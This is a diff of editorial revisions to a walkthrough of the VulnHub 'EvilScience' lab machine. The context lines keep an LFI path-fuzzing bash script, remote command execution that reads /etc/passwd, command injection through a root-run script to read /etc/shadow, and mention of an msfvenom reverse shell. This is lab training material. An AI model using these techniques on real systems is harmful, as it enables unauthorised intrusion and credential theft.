@@ -27,19 +27,19 @@ Let's kick this off with a `nmap` scan to establish the services available in th
 ...
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 12:09:bc:b1:5c:c9:bd:c3:ca:0f:b1:d5:c3:7d:98:1e (RSA)
 |_  256 de:77:4d:81:a0:93:da:00:53:3d:4a:30:bd:7e:35:7d (ECDSA)
 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: The Ether
 ```
 
-As usual, let's start with the web service. Here's what I see in the browser when I navigate to it.
+As usual, let's start with the web service. Here's what I saw in the browser when I navigated to it.
 
-![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-1.png){: style="display: block"} 
+![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-1.png){: style="display: block"}
 ![landing page](/assets/images/posts/evilscience-walkthrough/evilscience-3.png){: style="display: block"}
 
 Let's use `curl` and some `grep`-fu to see if there are any hyperlinks that I can work with.
@@ -61,12 +61,12 @@ layout/scripts/jquery.mobilemenu.js
 layout/scripts/jquery.flexslider-min.js
 ```
 
-Among the hyperlinks, two of them stood out immediately:
+Among the hyperlinks, two of them stood out:
 
 * `?file=about.php`
 * `?file=research.php`
 
-Could there be a LFI  vulnerability? We shall see.
+Could there be a LFI  vulnerability? We'll see.
 
 ### Directory/File Enumeration
 
@@ -90,9 +90,9 @@ File found: /layout/scripts/jquery.mobilemenu.js - 200
 File found: /research.php - 200
 ```
 
-The same two pages were found: `/about.php` and `/research.php`.
+`dirbuster` found the same two pages - `/about.php` and `/research.php`.
 
-Navigating to `/?file=about.php`, I noticed that the content of `/about.php` was included twice before the content of `/index.php`.
+Navigating to `/?file=about.php`, I noticed that the content of `/about.php` appeared twice before the content of `/index.php`.
 
 OK. Now I'm positive there is a LFI vulnerability with the `file` parameter.
 
@@ -106,13 +106,13 @@ I've tried the following common LFI attacks with no success:
 * `php://filter`
 * `php://include`
 
-However, I had success displaying the content of `/usr/share/apache2/icons/README` like so.
+I had success displaying the content of `/usr/share/apache2/icons/README`.
 
 ![README](/assets/images/posts/evilscience-walkthrough/evilscience-5.png)
 
 ![README](/assets/images/posts/evilscience-walkthrough/evilscience-6.png)
 
-This would means that absolute path is allowed but some kind of filtering for common LFI attacks is in place. It also means that the [**DocumentRoot**][4] is not your usual `/var/www/html`. :sweat:
+This meant that it allowed absolute path in the URL but some kind of filtering for common LFI attacks was in place. It also meant that the [**DocumentRoot**][4] is not at the usual `/var/www/html`. :sweat:
 
 Here's what I imagined the PHP code in `/index.php` to look like.
 
@@ -128,7 +128,7 @@ Here's what I imagined the PHP code in `/index.php` to look like.
 ?>
 {% endhighlight %}
 
-To that end, I wrote `fuzz.sh` in combination with the various wordlists from [SecLists][5] to map out the **DocumentRoot** by exploiting the `file` parameter. For this to work, a unique known string in the file must exists.
+To that end, I wrote `fuzz.sh`, a `bash` script to map out the **DocumentRoot** by exploiting the `file` parameter, in combination with the wordlists from [SecLists][5]. For this to work, a unique known string in the file must exists.
 
 {% highlight bash linenos %}
 # cat fuzz.sh
@@ -143,7 +143,7 @@ for word in $(cat "$WORDLIST"); do
     echo "[+] Trying ${PATTERN/FUZZ/$word}"
     if curl -s http://${HOST}/?file=${PATTERN/FUZZ/$word} \
        | grep -E "$KNOWN" &>/dev/null; then
-        echo
+        printf "\n"
         echo "[!] Found: http://${HOST}/?file=${PATTERN/FUZZ/$word}"
         break;
     fi
@@ -154,7 +154,7 @@ Now, let's give `fuzz.sh` a shot.
 
 ```
 # ./fuzz.sh "../FUZZ/about.php" "About The Ether" /usr/share/seclists/Discovery/Web_Content/common.txt
-...
+…
 [+] Trying ../pub/about.php
 [+] Trying ../public/about.php
 [+] Trying ../public_ftp/about.php
@@ -167,7 +167,7 @@ Navigating to `/?file=../public_html/about.php` gave me the confidence the scrip
 
 ![fuzz.sh](/assets/images/posts/evilscience-walkthrough/evilscience-4.png)
 
-Moving up the next level got me stuck for hours. Not knowing how to move forward, I chanced upon **theether.com** at the footer. 
+Moving up the next level got me stuck for hours. Not knowing how to move forward, I chanced upon **theether.com** at the footer.
 
 ![theether.com](/assets/images/posts/evilscience-walkthrough/evilscience-7.png)
 
@@ -191,8 +191,8 @@ for word in map(''.join, itertools.product(*zip(s.lower(), s.upper()))):
 Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.
 
 ```
-# ./fuzz.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt 
-...
+# ./fuzz.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt
+…
 [+] Trying ../../theeTHER.CoM/public_html/about.php
 [+] Trying ../../theeTHER.COm/public_html/about.php
 [+] Trying ../../theeTHER.COM/public_html/about.php
@@ -201,21 +201,21 @@ Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.
 [!] Found: http://192.168.198.130/?file=../../theEther.com/public_html/about.php
 ```
 
-With the rest of the higher levels mapped out fairly easy with the `common.txt` wordlist from SecLists, the **DocumentRoot** was finally determined to be: `/var/www/html/theEther.com/public_html`
+With the rest of the higher levels mapped out with the `common.txt` wordlist from SecLists, I was able to determine the **DocumentRoot** was at: `/var/www/html/theEther.com/public_html`
 
 ![docroot](/assets/images/posts/evilscience-walkthrough/evilscience-8.png)
 
-Sweet!
+Sweet.
 
 ### Access Log
 
-Since I can't access the default `/var/log/apache2/access.log`, there is a possibility that the access log could be defined elsewhere, perhaps even somewhere near.
+Since I can't access the default `/var/log/apache2/access.log`, there is a possibility that the access log was elsewhere, perhaps even somewhere near.
 
 Using `quickhits.txt` from SecLists with `fuzz.sh`, I was able to map out this location.
 
 ```
 # ./fuzz.sh "/var/www/html/theEther.comFUZZ" "^[0-9]" /usr/share/seclists/Discovery/Web_Content/quickhits.txt
-...
+…
 [+] Trying /var/www/html/theEther.com/log.sqlite
 [+] Trying /var/www/html/theEther.com/log.txt
 [+] Trying /var/www/html/theEther.com/log/
@@ -290,13 +290,13 @@ Let's give it a shot.
 ```
 # ./cmd.sh -e "cat /etc/passwd"
 root:x:0:0:root:/root:/bin/bash
-...
+…
 usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
 evilscience:x:1000:1000:evilscience,,,:/home/evilscience:/bin/bash
 sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
 ```
 
-Also, not quite the PHP code I imagined but close.
+Also, not the PHP code I imagined but close.
 
 {% highlight php linenos %}
 # ./cmd.sh -e "cat index.php"
@@ -330,7 +330,7 @@ To avoid complications, it's best to `urlencode()` the above and then spawn a ps
 
 ![shell](/assets/images/posts/evilscience-walkthrough/evilscience-9.png)
 
-I got shell!
+I got shell.
 
 ### Privilege Escalation
 
@@ -338,11 +338,11 @@ During enumeration, I noticed that user `evilscience` was able to `sudo` as `roo
 
 ![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-10.png)
 
-Interestingly, there was also a file with the `setuid` and `setgid` bit turned on. Noticed the file size on this guy? 11MB for a Python file? Something funky is going on here!
+There's also a file with the `setuid` and `setgid` bit turned on. Noticed the file size on this guy? 11MB for a Python file? Something funky is going on here.
 
 ![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-11.png)
 
-Finally, `www-data` had some pretty interesting permissions going on as well.
+`www-data` had some pretty interesting permissions going on as well.
 
 ![sudo](/assets/images/posts/evilscience-walkthrough/evilscience-12.png)
 
@@ -360,13 +360,13 @@ _For `/var/log/apache2/access.log`_
 
 ![access.log](/assets/images/posts/evilscience-walkthrough/evilscience-14.png)
 
-So, `cat` was used to display the content of the files. Recall from above that `www-data` was able to run `xxxlogauditorxxx.py` as `root` without password?
+It used `cat` to display the content of the files. Recall from above that `www-data` was able to run `xxxlogauditorxxx.py` as `root` without password?
 
-Armed with this new knowledge that `cat` was used, let's see if we can display `/etc/shadow` along with `/var/log/auth.log`.
+Armed with this new knowledge, let's see if we can display `/etc/shadow` along with `/var/log/auth.log`.
 
 ![shadow](/assets/images/posts/evilscience-walkthrough/evilscience-16.png)
 
-Holy smoke. It worked!
+Holy smoke. It worked.
 
 My guess is that the command ran like this.
 
@@ -374,13 +374,13 @@ My guess is that the command ran like this.
 cat /var/log/auth.log /etc/shadow
 ```
 
-I can possibly use command substitution with backticks or `$()` to execute another command as `root`. But first, let's generate a single-stage reverse shell with `msfvenom` and transfer it over.
+I can possibly use command substitution with backticks to execute another command as `root`. But first, let's generate a single-stage reverse shell with `msfvenom` and transfer it over.
 
 ![msfvenom](/assets/images/posts/evilscience-walkthrough/evilscience-17.png)
 
 ![nc](/assets/images/posts/evilscience-walkthrough/evilscience-18.png)
 
-Time to test my hypothesis!
+Time to test my hypothesis.
 
 ![xxxlogauditorxxx.py](/assets/images/posts/evilscience-walkthrough/evilscience-21.png)
 
@@ -398,7 +398,7 @@ There was a long `base64` encoded string appended to the end of the file like so
 
 ![base64](/assets/images/posts/evilscience-walkthrough/evilscience-20.png)
 
-Finally, the cat is out of the bag!
+The cat is now out of the bag.
 
 ```
 # strings flag.png | sed '$!d' | sed 's/flag: //' | base64 -d
@@ -436,7 +436,7 @@ We have decided to stop conducting these experiments due to the lack of antidote
 
 ### Afterthought
 
-_Not for the feint of heart_ :broken_heart:
+Not for the faint of heart :broken_heart:
 
 [1]: https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/
 [2]: https://securityshards.wordpress.com/
